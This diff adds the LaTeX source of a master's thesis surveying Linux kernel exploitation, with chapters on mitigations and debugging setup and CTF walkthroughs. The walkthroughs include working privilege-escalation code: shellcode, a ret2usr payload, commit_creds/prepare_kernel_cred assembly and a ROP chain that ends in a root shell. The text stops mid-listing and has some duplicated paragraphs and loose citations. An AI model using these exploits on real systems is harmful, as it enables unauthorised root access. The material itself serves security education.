@@ -1,0 +1,1267 @@
+\documentclass{masterthesis}
+
+\usepackage{graphicx}
+\usepackage{flexisym}
+\usepackage{xspace}
+\usepackage{todonotes}
+\usepackage{enumitem}
+\usepackage{tabto}
+\usepackage{amsfonts}
+\usepackage{pgfplots}
+\usepackage[bookmarks=true,colorlinks=true,linkcolor=blue,citecolor=blue,filecolor=blue,urlcolor=blue]{hyperref}
+
+%listing
+\usepackage{listings}
+\usepackage{color}
+
+
+\definecolor{dkgreen}{rgb}{0,0.6,0}
+\definecolor{gray}{rgb}{0.5,0.5,0.5}
+\definecolor{mauve}{rgb}{0.58,0,0.82}
+\setlength {\marginparwidth }{2cm} 
+\lstset{frame=tb,
+  aboveskip=3mm,
+  belowskip=3mm,
+  showstringspaces=false,
+  columns=flexible,
+  basicstyle={\small\ttfamily},
+  numbers=none,
+  numberstyle=\tiny\color{gray},
+  keywordstyle=\color{blue},
+  commentstyle=\color{dkgreen},
+  stringstyle=\color{mauve},
+  breaklines=true,
+  breakatwhitespace=true,
+  tabsize=3,
+  language=C
+}
+
+\newcommand{\vtnote}[1]{\todo[color=green!20]{#1}}
+\newcommand{\glnote}[1]{\todo[color=blue!20]{#1}}
+
+% macros
+\newcommand{\checkthis}[1]{{\color{red}{#1}}}
+\newcommand{\refToChapter}[1]{Chapter~\ref{ch:#1}\xspace}
+\newcommand{\refToSection}[1]{Section~\ref{sect:#1}\xspace}
+\newcommand{\refToSubSection}[1]{Subsection~\ref{subsect:#1}\xspace}
+
+\begin{document}
+
+\title{A survey of kernel-exploitation techniques}
+
+\author{Vincenzo Terracciano}
+
+\advisor{Giovanni Lagorio}
+
+\examiner{Alessandro Armando}
+
+\maketitle
+
+\tableofcontents
+
+\chapter{Introduction}
+
+\chapter{Kernel}
+\label{ch:kernel}
+
+We start our research about \emph{kernel exploitation} with an clear purpose: explaining what the kernel is and what exploitation signifies.
+When we talk about a computer, we generally think of a set of physical devices (processor, motherboard, memory, hard drive, keyboard, etc.) that let us  perform simple tasks such as writing, sending an e-mail, watching a movie, surfing the Web and so on.
+The kernel has complete control over everything in the system. It is the \emph{portion of the operating system code} that is always resident in memory, and facilitates interactions between hardware and software components.
+Typically the kernel is responsible for memory management, process and task management and disk management.
+Between these bits of hardware and applications we work on every day there is a layer of software that makes it possible all the hardware work efficiently and create an infrastructure which the applications can work.
+This layer of software is the operating system, and its core is the kernel.
+
+In modern operating systems, the kernel acts for the things we normally assume: virtual memory, hard-drive access, input/output handling, and so forth. Generally larger than most user applications, the kernel is a complex and charming piece of code usually written in a collection of assembly, the low level machine language, and C.
+Moreover, the kernel employs some underlying architecture properties to separate itself from the rest of the running programs.
+In fact, most \emph{Instruction Set Architectures} ~\cite{silberman1993architectural} supply at least two modes of execution: a \emph{privileged mode}, where the machine-level instructions are completely accessible, and an \emph{unprivileged/user mode}, in which only a subset of instructions are accessible.
+Furthermore, the kernel protects itself from user applications by realizing separation at the software level.
+When we have to set up the virtual memory subsystem, the kernel makes it possible to access the address space (i.e., the range of virtual memory addresses) of any process, and no process can directly refer to the kernel memory.\\
+
+Moreover, the kernel protects itself from user applications by implementing separation at the software level. When it comes to setting up the virtual memory subsystem, the kernel ensures that it can access the address space (i.e., the range of virtual memory addresses) of any process and that no process can directly reference the kernel memory. 
+We will call the memory visible only to the kernel as \emph{kernel-land} memory and the memory a user process sees as \emph{user-land} memory. The term ``user-land'' refers to all code that runs outside the operating system's kernel. User-land usually refers to the various programs and libraries that the operating system uses to interact with the kernel.
+Code executing in kernel-land runs with full privileges and can access any valid memory address on the system, while code executing in user-land is subject to all limits as describe above.
+Code executing in kernel land runs with full privileges and can access any valid memory address on the system, whereas code executing in user-land is subject to all the limitations we described earlier.
+
+
+\chapter{Art of Exploitation}
+\label{ch:exploitation}
+
+There are various ways an attacker can gain root privileges, the most excitement is generally performed with the development of an \emph{``exploit''}.
+The meaning behind \emph{exploitation} is really simple: software has bugs, and these make the software work not correctly, or otherwise perform incorrectly a task that had to perform in an appropriate way.
+And all this means an advantage for the \emph{attacker}. Not every bug is exploitable; we refer to those that are as \emph{vulnerabilities}.
+Analyzing an application to establish its vulnerability is called \emph{auditing}. It entails:
+\begin{itemize}
+\item \emph{Reading} the source code of the application, if available;
+\item \emph{Reversing} the application binary; that is, reading the disassembly of the compiled code;
+\item \emph{Fuzzing} the application interface; that is feeding the application random or pattern-based, automatically generated input.
+\end{itemize}
+
+\section{Difference between Kernel-land and Userl-land}
+\label{sect:land}
+With the large diffusion of security patches and the contemporary reduction of user-land vulnerabilities, the attention of exploits writers has gone toward the core of the operating system.
+However, writing a \emph{kernel-land exploit} presents various extra challenges if compared to a user-land exploit:
+\begin{itemize}
+\item The kernel is the only piece of software that is strictly for the system. As long as the kernel works correctly, there is no incorrigible situation.\\
+This explains why user-land brute forcing, for example, is a feasibly choice: the only real worry we have to confront when we repeatedly crash our victim application is the noise we might create in the logs.
+When it comes to the kernel, this hypothesis is not true anymore: an error at the kernel level leaves the system in an \emph{inconsistent state}, and it is usually required to take back the machine to its appropriate functioning.
+If the error happens inside one of the sensible areas of the kernel, the operating system will just shut down, a condition known as panic~\cite{cheng2021kernel}.
+\item The kernel is protected from user-land via both software and hardware. Finding information about the kernel is a much more difficult job. At the same time, the number of variables that are no more under the attacker’s control intensifies in an exponentially way. For example, let's consider the \emph{memory allocator}.
+In a user-land exploit, the allocator is inside \emph{the process}, generally connected through a shared system library. Your purpose is its only consumer and its only \emph{affecter}. On the other side, all the processes on the system may concern the behavior and the status of a kernel memory allocator.
+\item The kernel is a large and complex system. The dimension of the kernel is substantive, on the order of millions of lines of source code:
+\begin{figure}[h!]
+\caption{Number of lines of Unix kernel code from 2004 to 2020. While the number of developers has decreased, the growth of the kernel code is constant.}
+   \makebox[\textwidth][c]{\includegraphics[height=0.4
+  \textwidth]{images/linux-lines-code.png}}
+   \caption{Growth of Codebase Kernel Linux}
+   \label{line_code_graphview}
+\end{figure} 
+The kernel has to control all the hardware on the computer and most of the lower-level software
+abstractions (virtual memory, file systems, IPC facilities, etc.). This implies many hierarchical, interconnected subsystems that the attacker may have to deeply understand to successfully trigger and exploit a specific
+vulnerability. This characteristic can also become an advantage for the exploit developer, as a complex system is also less likely to be bug-free.
+\end{itemize}
+\subsection{Example of User-land and Kernel-land exploit}
+\label{subsect:example_of_kernel_user_land}
+
+To understand differences and similarities with user-land, we will show two examples in both environments and we will see similarities and differences. In this case, we will merely consider the file that allows the exploit and what we will be able to obtain by exploiting the vulnerabilities present in the kernel/program.
+
+The CTF ~\cite{m0leconTeaser2020_babyk} uses an unprotected kernel where they provide the source code and the exploited vulnerability is a buffer overflow.
+
+The goal is to read the flag in the directory \textit{/home/user/exp} to overcome the challenge.
+
+\begin{lstlisting}
+#define MAP_PRIVATE     0x02    /* Changes are private.  */
+#define MAP_FIXED       0x10    /* Interpret addr exactly.  */
+#define MAP_ANONYMOUS   0x20    /* Don't use a file.  */
+#define O_RDWR        0x0002  /* open for reading and writing */
+
+typedef unsigned long long qword;
+
+extern void kernel_shellcode();
+char user_shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+qword mcpy(char * dst, char * src, qword n)
+{
+    for (qword i = 0; i < n; ++i)
+        dst[i] = src[i];
+  return n;
+}
+
+void * mmap(void * addr, qword size, qword prot, qword flags)
+{
+    return syscall64(9, addr, size, prot, flags, -1, 0);
+}
+int _start (int argc, char **argv) 
+{
+  char buf[0x1000];
+  char * payload = buf;
+    // Prepare memory for ret2usr
+  void *userland_stack = mmap((void *)0xcafe000, 0x1000, 7, MAP_ANONYMOUS|MAP_PRIVATE|0x0100);
+  void *userland_code = mmap((void *)0x1234000, 0x1000, 7, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE);
+  mcpy(userland_code, &user_shellcode,sizeof(user_shellcode));
+
+    // Fill up stack until saved_rip
+  for (int i = 0;  i < 124; i++)
+    *(payload++) = 'A';
+  *(qword *)payload = (qword) kernel_shellcode; payload += 8;
+  // Profit
+  int vuln_fd = syscall64(2, "/proc/babydev", O_RDWR,100,0, 0,0);
+  syscall64(1, vuln_fd, buf, payload - buf, -1,-1,-1);
+  syscall64(0x60, 0, -1,-1,-1,-1,-1);
+  return 0;
+}
+\end{lstlisting}
+\begin{lstlisting}
+.text
+.intel_syntax noprefix
+
+.global syscall64
+.global kernel_shellcode
+
+kernel_shellcode:
+    # commit_cred(prepare_kernel_creds(0))
+    xor rdi, rdi
+    mov rcx, 0xffffffff81052a60     # cat kallsyms | grep prepare_kernel_creds
+    call rcx
+    mov rdi, rax
+    mov rcx, 0xffffffff81052830     # cat kallsyms | grep commit_creds
+    call rcx
+context_switch:
+    swapgs
+    # ss
+    mov r15, 0x2b
+    push 0x2b 
+    # rsp - mmapped value
+    mov r15, 0xcafe000
+    push r15
+    # rflags - dummy value
+    mov r15, 0x246
+    push r15
+    # cs
+    mov r15, 0x33
+    push r15
+    # rip - mmapped value
+    mov r15, 0x1234000
+    push r15
+    iretq
+end_kernel_shellcode:
+    nop
+
+syscall64:
+    pop r14
+    pop r15
+    push r15
+    push r14
+    sub rsp, 0x100
+
+    mov rax, rdi
+    mov rdi, rsi
+    mov rsi, rdx
+    mov rdx, rcx
+    mov r10, r8
+    mov r8,r9 
+    mov r9, r15
+    syscall
+
+    add rsp, 0x100
+    ret
+\end{lstlisting}
+
+The codes above allow you to gain root privileges by taking control of the saved rip by returning the kernel to the user mapped code \textit{user_shellcode} and executing \texttt{commit_creds(prepare_kernel_creds(0))} without crashing the kernel by generating a shell and reading the flag.
+
+Let's consider this user agent instead:
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+int check (char *pwd) {
+  int auth_flag = 0;
+  char pwd_buffer [ 16 ] ;
+  strcpy ( pwd_buffer , pwd) ;
+  if ( strcmp ( pwd_buffer , "sonoio" ) == 0 )
+    auth_flag = 1;
+  return auth_flag ;
+}
+int main ( int argc , char *argv [ ] ) {
+  if (check ( argv [ 1 ] ) )
+    printf ( "AUTHENTICATED!\n" ) ;
+  else
+    printf ( "ACCESSO NEGATO!\n" ) ;
+}
+\end{lstlisting}
+If such code, executed without the stack protector \texttt{-fno-stack-protector}, is passed either \textit{sonoio} or \textit{AAAAAAAAAAAAAAAAAA} we get \textit{AUTHENTICATED}.
+This is because if I exceed the size of the buffer I overwrite the next variable in memory, in this case, \textit{auth_flag}, which becomes different from 0 and therefore passes the final test.
+
+In both cases, we overflow the buffer, but let's take a closer look at what we do.
+
+In the first case, we have total access to the system, allowing us to move around it at will.
+With this level of permissions, it is possible to take control of the security system and render it useless by applying patches to all integrity checks that are done by the system.
+We can read the flag because we have root privileges.
+
+In the second case instead, it allows us to explore the system with limited permissions, we can execute unauthorized code where it was not possible before. Which translates into the ability to use emulators or write your programs. In the example above, however, we can "authenticate" by bypassing the present control.
+
+
+These two examples allow us to understand how a kernel-land exploit is much more powerful and invasive than a user-land exploit.
+
+
+\chapter{Analysis Environment}
+\label{ch:analyze}
+
+\section{Debugging}
+\label{sect:debugging}
+In user space we have the support of the kernel so we could easily stop processes and use gdb to inspect their behavior.
+GDB~\cite{stallman1988debugging}) allows you to see what is going on \emph{inside} another program while it executes -- or what another program was doing at the moment it crashed.
+\subsection{GDB}
+\label{subsect:gdb}
+GDB can do four main kinds of things to help you catch bugs in the act:
+\begin{itemize}
+\item Start your program, specifying anything that might affect its behavior.
+\item Make your program stop on specified conditions.
+\item Examine what has happened, when your program has stopped.
+\item Change things in your program, so you can experiment with correcting the effects of one bug and go on to learn about another.
+\end{itemize}
+Using gdb allows us to debug the kernel in the familiar and powerful debugging interface of gdb.
+In order to debug a kernel we have two options:
+\begin{itemize}
+\item A serial connection and another pc;
+\item Use a Hypervisor.
+\end{itemize}
+Given the lack of convenience of the first option, a hypervisor is preferred.
+Among them we have \emph{QEMU} ~\cite{bellard2005QEMU}, a hosted hypervisor, that is, running within a traditional operating system, just like any other program.
+The Linux kernel provides a set of tools and debug options useful for investigating abnormal behavior.
+\subsection{Running QEMU}
+\label{subsect:QEMU}
+As said previously, to debug the kernel we use the QEMU hypervisor. Specifically, there are some options needed in kernel analysis:
+\begin{itemize}
+\item \texttt{-kernel  ``path"}, the path to kernel image to run;
+\item \texttt{-initrd ``path"}, path to the initial \emph{ram disk}. In short, a RAM disk is a filesystem dynamically placed in memory at boot time, containing drivers and kernel modules needed to get your real filesystem mounted and to start the first processes to get your whole system running as expected;
+\item \texttt{-gdb }\textit{dev}, wait for gdb connection on device \textit{dev}. Typical connections will likely be TCP-based, but also UDP, pseudo TTY, or even stdio are reasonable use case;
+\item \texttt{-s}, shorthand for \texttt{-gdb tcp::1234}, i.e. open a gdbserver on TCP port 1234;
+\item \texttt{-S}, freeze the CPU on startup;
+\item \texttt{-cpu model}, select CPU model. Here we can add \texttt{+smep} and \texttt{+smap} for \emph{SMEP} \refToSubSection{SMEP} and \emph{SMAP} \refToSubSection{SMAP} mitigation features;
+\item \texttt{-m [size=]}\textit{megs}, set virtual RAM size to \textit{megs} megabytes;
+\item \texttt{-append}, specifies additional boot options. This is also where we can enable/disable mitigation features.
+\end{itemize}
+These options are essential for analyzing the kernel. But QEMU supports other options (indicate the documentation site) which may be useful for running the system and to help the user in the analysis.
+\section{Kernel configuration}
+\label{sect:configuration}
+When you want to analyze the kernel it is not recommended to just run it. The kernel developers have integrated several debugging features into the kernel itself to analyze it that can be enabled.
+So to enable these features you need to compile and install it.
+
+When building a kernel for debugging with gdb, we would advise using the following configuration options to make debugging a bit more pleasant. 
+
+Except where specified otherwise, all of these options are found under the \emph{``kernel hacking"} menu in whatever kernel configuration tool you prefer. Note that some of these options are not supported by all architectures and even if they are added, they may be not considered for the building.
+\begin{itemize}
+\item \texttt{CONFIG\_GDB\_SCRIPTS} adds links to the GDB helper scripts. We find it particularly useful when debugging a kernel module, when we need to inspect the kernel log buffer or VFS mounts.
+
+\item \texttt{CONFIG\_KGDB} enables the built in kernel debugger, which allows for remote debugging. Technically this option is the only one that is strictly required, but attempting to debug without debug symbols will make debugging much harder.
+
+\item \texttt{CONFIG\_FRAME\_POINTER} inserts code to into the compiled executable which saves the frame information in registers or on the stack at different points.
+
+\item \texttt{CONFIG\_DEBUG\_KERNEL} makes other debugging options available.
+
+\item \texttt{CONFIG\_DEBUG\_SLAB} turns on several types of checks in the kernel memory allocation functions; with these checks enabled, it is possible to detect a number of memory overrun and missing initialization errors.
+
+\item \texttt{CONFIG\_DEBUG\_PAGEALLOC} where full pages are removed from the kernel address space when freed. This option can slow things down significantly, but it can also quickly point out certain kinds of memory corruption errors.
+
+\item \texttt{CONFIG\_DEBUG\_SPINLOCK} allows to the kernel to catch operations on uninitialized spinlocks and various other errors.
+
+\item \texttt{CONFIG\_INIT\_DEBUG} where items marked with \lstinline{__init} (or \lstinline{__initdata}) are discarded after system initialization or module load time. This option enables checks for code that attempts to access initialization-time memory after initialization is complete.
+
+\item \texttt{CONFIG\_DEBUG\_INFO} causes the kernel to be built with full debugging information included. Including debug information in the kernel and kernel modules will make both the image and the modules larger in size.
+\end{itemize}
+These options are the most used for kernel analysis~\cite{kernel_analysis}.
+If you do not want to use menuconfig is possible to set configuration options via command line using the following
+\lstinline{$ ./scripts/config -e CONFIG_<your option>} .
+Once you have enabled all these options, you need to build the kernel.
+This is done from the command line \lstinline{$ make -j$(nproc)}
+
+Before starting the VM and attempting to attach gdb, set up gdb to load the Linux helper scripts by adding \lstinline[language={}]{add-auto-load-safe-path} to your \lstinline{~/.gdbinit}.
+
+\chapter{Linux kernel mitigation features}
+\label{ch:mitigation}
+In this chapter, we will see with which techniques the kernel defends itself from possible attacks.
+From those similar to userland \refToSection{like userland} to specific ones tailored to the kernel \refToSection{powerful mitigation}
+\section{Mitigation features like Userland}
+\label{sect:like userland}
+Just like mitigation features such as ASLR, stack canaries, PIE, etc. used by userland programs, kernel also have their own set of mitigation features. Below are some of the popular and notable Linux kernel mitigation features.
+
+\subsection{Kernel stack canary}:
+\label{subsect:canary}
+Stack canaries are a mitigation targeted at stack-based buffer overflow attacks. It works by exploiting one of the limitations of these kind of attacks, namely, that the attacker must overwrite all the bytes between the overflown buffer and the control data (i.e., saved registers and the return address). The idea is to put a value—the canary—between the local variables and the control data of each function stack frame. The attacker, thus, has to overwrite the canary before she can overwrite the control data. If overwriting the canary is impossible or can be detected, the attack is blocked.
+It is enabled in the kernel at compile time and cannot be disabled.
+
+\subsection{Kernel address space layout randomization}
+\label{subsect:KASLR}
+Also like ASLR on userland, it is a computer security technique involved in preventing exploitation of memory corruption vulnerabilities. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.
+With kernel address space layout randomization (KASLR), the kernel is loaded to a random location in memory.
+Loading the kernel to a random location can protect against attacks that rely on knowledge of the kernel addresses.
+The KASLR feature is enabled by default.
+
+\section{Powerful linux mitigation features}
+\label{sect:powerful mitigation}
+In \refToSubSection{SMEP} we discuss a mitigation present on the Intel i386 processor~\cite{inteli386}.
+
+The \refToSubSection{SMAP} discusses a mitigation characteristic of some CPU implementations such as the Intel Broadwell~\cite{nalamalpu2015broadwell}microarchitecture.
+
+In \refToSubSection{KPTI} we discuss mitigation to address a vulnerability that primarily affects Intel's x86 CPUs and improves kernel hardening against attempts to bypass the randomization of the kernel address space layout.
+
+The mitigation in \refToSubSection{FG-KASLR} was introduced by the Linux PaX~\cite{nalamalpu2015broadwell} project which first coined the term ``ASLR" and published the first project and implementation of ASLR in July 2001 as a patch for the Linux kernel. It is seen as a full implementation, also providing a kernel stack randomization patch since October 2002.
+\subsection{Supervisor mode execution protection (SMEP)}
+\label{subsect:SMEP}
+The processor introduces a new machanism that provides next level of system protection by blocking malicious software attacks from user mode code when the system is running in the highest privilege level.
+This feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. In the kernel, this is enabled by setting the 20th bit of Control Register CR4.
+
+\subsection{Supervisor Mode Access Prevention}
+\label{subsect:SMAP}
+Supervisor Mode Access Prevention (SMAP) allows supervisor mode programs to optionally set user-space memory mappings so that access to those mappings from supervisor mode will cause a trap. This makes it harder for malicious programs to ``trick" the kernel into using instructions or data from a user-space program.
+Complementing SMEP, this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the 21st bit of Control Register CR4.
+
+\subsection{Kernel page-table isolation}
+\label{subsect:KPTI}
+Kernel page-table isolation (KPTI or PTI,previously called KAISER) is a Linux kernel feature improves kernel hardening against attempts to bypass kernel address space layout randomization (KASLR). It works by better isolating user space and kernel space memory.
+This mitigation was added to avoid the \emph{Meltdown}~\cite{lipp2018meltdown}.
+When this feature is active, the kernel separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contains both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a minimal set of kernel-space addresses.
+
+\subsection{Function Granular Kernel Address Space Layout Randomization}
+\label{subsect:FG-KASLR}
+Probably is the strongest linux kernel mitigation feature.
+This patch set is an implementation of finer grained kernel address space randomization. It rearranges your kernel code at load time on a per-function level granularity, with only around a second added to boot time.
+KASLR was merged into the kernel with the objective of increasing the difficulty of code reuse attacks. Code reuse attacks reused existing code snippets to get around existing memory protections. They exploit software bugs which expose addresses of useful code snippets to control the flow of execution for their own nefarious purposes. KASLR moves the entire kernel
+code text as a unit at boot time in order to make addresses less predictable.
+The order of the code within the segment is unchanged - only the base address is shifted. There are a few shortcomings to this algorithm.\\
+\begin{enumerate}
+\item Low Entropy - there are only so many locations the kernel can fit in. This means an attacker could guess without too much trouble.
+\item Knowledge of a single address can reveal the offset of the base address, exposing all other locations for a published/known kernel image.
+\item Info leaks abound.
+\end{enumerate}
+
+Finer grained ASLR has been proposed as a way to make ASLR more resistantto info leaks. It is not a new concept at all, and there are many variations possible. Function reordering is an implementation of finer grained ASLR which randomizes the layout of an address space on a function level granularity.
+
+\chapter{Intensification of mitigation features}
+\label{ch:adding mitigation}
+In this chapter, we will show how mitigations make it harder to exploit root privileges.
+In particular, we will explore the resolution of a \emph{CTF}~\cite{hxp-CTF-2020-kernel-rop}, starting from an environment without mitigations up to adding all the mitigations to solve the real CTF.
+To do this we will use a technique called \emph{ROP}~\cite{roemer2012return} with a module having an extremely trivial and standard bug.
+\section{Setup environment}
+Our task is to exploit a vulnearable custom kernel module that is installed into the kernel on boot.
+We will use the setup seen for the kernel in the section \refToSection{configuration} and the one for QEMU \refToSubSection{QEMU}.
+Since it is a CTF, where it is usual to use a flag to prove that you are getting the admin mode, you need to add some options in the QEMU setup.
+To do this, the command is also added to the QEMU settings:
+\lstinline{-hdb flag.txt}
+that it puts flag.txt into /dev/sda instead of leaving the flag.txt as a normal file in the system.
+Another important step is to find gadgets inside the kernel to be able to perform a rop chain.
+This is possible with ROPgadget~\cite{rop_gadget}, which searches for all possible gadgets within the kernel.
+Since this type of operation produces an enormous amount of data, it is preferable to save everything on a file that can always be consulted for the following steps.
+To perform the exploit, the executable file containing the necessary steps for the exploit must be inserted into the file system.
+\subsection{Analyzing the kernel module}
+\label{subsect:hackme}
+The module contains 6 methods.
+They allow you to communicate with this module by opening \lstinline{/dev/hackme} and reading and writing to it.
+\begin{lstlisting}
+ssize_t __fastcall hackme_write(file *f, const char *data, size_t size, loff_t *off)
+{
+    //...
+    int tmp[32];
+    //...
+    if ( _size > 0x1000 )
+    {
+        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
+        BUG();
+    }
+    _check_object_size(hackme_buf, _size, 0LL);
+    if ( copy_from_user(hackme_buf, data, v5) )
+        return -14LL;
+    _memcpy(tmp, hackme_buf);
+    //...
+}
+ssize_t __fastcall hackme_read(file *f, char *data, size_t size, loff_t *off)
+{
+    //...
+    int tmp[32];
+    //...
+    _memcpy(hackme_buf, tmp);
+    if ( _size > 0x1000 )
+    {
+        _warn_printk("Buffer overflow detected (%d < %lu)!\n", 4096LL, _size);
+        BUG();
+    }
+    _check_object_size(hackme_buf, _size, 1LL);
+    v6 = copy_to_user(data, hackme_buf, _size) == 0;
+    //...
+}
+\end{lstlisting}
+The bug, the same in both methods, reads/writes to a buffer stack of length 0x80 bytes, but only warns of a buffer overflow if the size is greater than 0x1000. Using this bug, we can freely read/write to the kernel stack.
+
+\section{Stack cookies}
+Now, let's see what we can do with the above primitives to gain root privileges, starting with one possible mitigation feature: only cookies stack.
+
+The idea is to put the piece of code which we want the program’s flow to jump into in the userland itself. After that, we simply overwrite the return address of the function that is being called in the kernel with that address. Because the vulnerable function is a kernel function, our code - even though being in the userland - is executed under kernel mode. In this way, we have already achieved arbitrary code execution.
+For this technique to work, we will remove most of the mitigation features in the QEMU run the script by removing +smep, +smap, kpti=1, kaslr, and adding nopti, nokaslr.
+\subsection{Step by step to exploit}
+First of all let's open the hackme function with the \emph{open} method. It returns a file descriptor which will be used later in the next steps.
+Using a \emph{read} function, we are going to read the stack.
+The \emph{buffer} in the stack itself is 0x80 bytes long and the stack cookie is immediately after it. Therefore, if we read the data in an unsigned long array (of which each element is 8 bytes), the cookie will be at offset 16.
+To overwrite the return address, the same procedure is carried out for leaking, overwriting the cookie with ours. Note, however, that after the cookie there are 3 registers \emph{rbx, r12, and rbp} (different in the userland because the only rbp appears).
+This involves inserting three dummy values after our cookie and inserting the return address we want our program to return to, which corresponds to the function we will create in the user area to get root privileges.
+\subsection{Getting root privileges}
+\label{subsect:get privileges}
+Our goal is to get root privileges on the system.
+This can be done through two functions that already reside in the same kernel-space code: \texttt{commit_creds()} and \texttt{prepare\_kernel\_cred()}.
+Since KASLR is disabled, the addresses where the functions reside are constant at every start. So we can get those addresses by reading the \texttt{/proc/kallsyms} file with the following terminal commands:
+\begin{lstlisting}
+cat /proc/kallsyms | grep commit_creds
+-> ffffffff814c6410 T commit_creds
+cat /proc/kallsyms | grep prepare_kernel_cred
+-> ffffffff814c67f0 T prepare_kernel_cred}
+\end{lstlisting}
+Then to get root privileges you need to write a code where the two functions are called consecutively using the return value of one as a parameter of the other.
+At this point, we need to recall an instruction that allows you to return to userland.
+This can be done with \emph{iretq} or \emph{sysretq}.
+With iretq it is much simpler as you need to configure the stack with 5 user area registry values in this order:\texttt{RIP | CS | RFLAGS | SP | SS}.
+For the \texttt{RIP}, we can set the address of the function that allows you to open a shell, while for the others you need to enter values that return to a state before entering kernel mode.
+The best solution, therefore, is to save the state of the registers before entering kernel mode and reload them after obtaining root privileges.
+\begin{lstlisting}
+void save_state(){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov user_cs, cs;"
+        "mov user_ss, ss;"
+        "mov user_sp, rsp;"
+        "pushf;"
+        "pop user_rflags;"
+        ".att_syntax;"
+    );
+    puts("[*] Saved state");
+}
+\end{lstlisting}
+Before iretq, it is appropriate to invoke the \emph{swapgs} instruction because syscall does not change RSP to point to the kernel stack (and it does not save RSP user space anywhere). So some kind of thread-local (or core-local) storage is needed so that each core can get the correct kernel stack pointer for the task running on that core.
+A possible code to gain root privileges is:
+\begin{lstlisting}
+unsigned long user_rip = (unsigned long)get_shell;
+void escalate_privs(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "movabs rax, 0xffffffff814c67f0;" //prepare_kernel_cred
+        "xor rdi, rdi;"
+      "call rax; mov rdi, rax;"
+      "movabs rax, 0xffffffff814c6410;" //commit_creds
+      "call rax;"
+        "swapgs;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_rip;"
+        "push r15;"
+        "iretq;"
+        ".att_syntax;"
+    );
+}
+\end{lstlisting}
+\section{Adding SMEP}
+In \refToSubSection{get privileges} we used our piece of code which is saved in the userspace. By activating SMEP, as \refToSubSection{SMAP}, user pages are marked as not executable while in kernel mode.
+There are two possible scenarios:
+\begin{itemize}
+\item Write an arbitrary amount of data to the kernel stack.
+\item Overwrite up to the return address on the kernel stack.
+\end{itemize}
+\subsection{Overwrite CR4}
+\label{subsect:CR4}
+The 20th bit of the CR4 control register is responsible for enabling or disabling SMEP.
+In kernel mode, we have the power to modify the contents of the control register.
+To do this there is a special instruction \lstinline{mov cr4, rdi} called by a function called \texttt{native\_write\_cr4()}.
+So to be able to bypass SMEP you try to execute ROP inside this function.
+As for the \emph{commit\_creeds()} and \emph{prepare\_kernel\_cred()} functions, we find the address by reading \lstinline{/proc/kallsyms}.
+To build the ROP chain we use the same approach used in userland, but instead of going back to our userland code, we go back into the native\_write\_cr4(value) function, insert the value we need and then go back to the code to get the privileges.
+By reading the documentation of the CR4 bit, the developers, knowing of this possible solution to bypass SMEP, have blocked the possibility of overwriting that bit.
+Each time they are overwritten they are reset with the kernel boot settings.
+So the first scenario cannot be undertaken to obtain privileges.
+\subsection{Second scenario}
+\label{subsect:second scenario}
+In the second scenario, however, we will no longer exploit our userland code but only the ROP technique.
+The plan is quite simple:
+\begin{itemize}
+\item ROP into prepare\_kernel\_cred(0), already seen.
+\item ROP into commit\_creds (), with the return value from step 1 as the parameter.
+\item ROP into swapgs; ret.
+\item ROP into iretq with the stack setup as RIP | CS | RFLAGS | SP | SS, already seen.
+\end{itemize}
+The ROP chain is trivial, but the gadgets found in the kernel cannot always be exploited, so many attempts must be made to find the right gadget.
+Some instructions might seem strange, but sometimes only some are really usable and executable.
+For example, to move the return value in step 1 (stored in rax) to rdi to move to \texttt{commit\_creds()}, the only instructions are:
+\begin{lstlisting}
+unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx; ret
+unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8; jne 0xffffffff81964cbb; pop rbx; pop rbp; ret
+unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax; jne 0xffffffff8166fe7a; pop rbx; pop rbp; ret
+\end{lstlisting}
+They might sound a little bizarre, but all the ordinary gadgets tried are not executable.
+This is not always the case, it depends on the kernel in use, in fact very important at this stage is to try all possible solutions.
+The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the \texttt{commit\_creds function(prepare\_kernel\_cred(0))}
+While ROPgadget can find swapgs, it does not find iretq, so we use objdump~\cite{weatherspoonassemblers} to find the right address and be able to write the full ROP chain.
+\begin{lstlisting}
+void get_shell(void){
+    puts("[*] Returned to userland");
+    if (getuid() == 0){
+        printf("[*] UID: %d, got root!\n", getuid());
+        system("/bin/sh");
+    } else {
+        printf("[!] UID: %d, did not get root\n", getuid());
+        exit(-1);
+    }
+}
+unsigned long user_rip = (unsigned long)get_shell;
+
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
+unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+unsigned long commit_creds = 0xffffffff814c6410;
+unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
+unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
+unsigned long iretq = 0xffffffff8100c0d9;
+
+void overflow(void){
+    unsigned n = 50;
+    unsigned long payload[n];
+    unsigned off = 16;
+    payload[off++] = cookie;
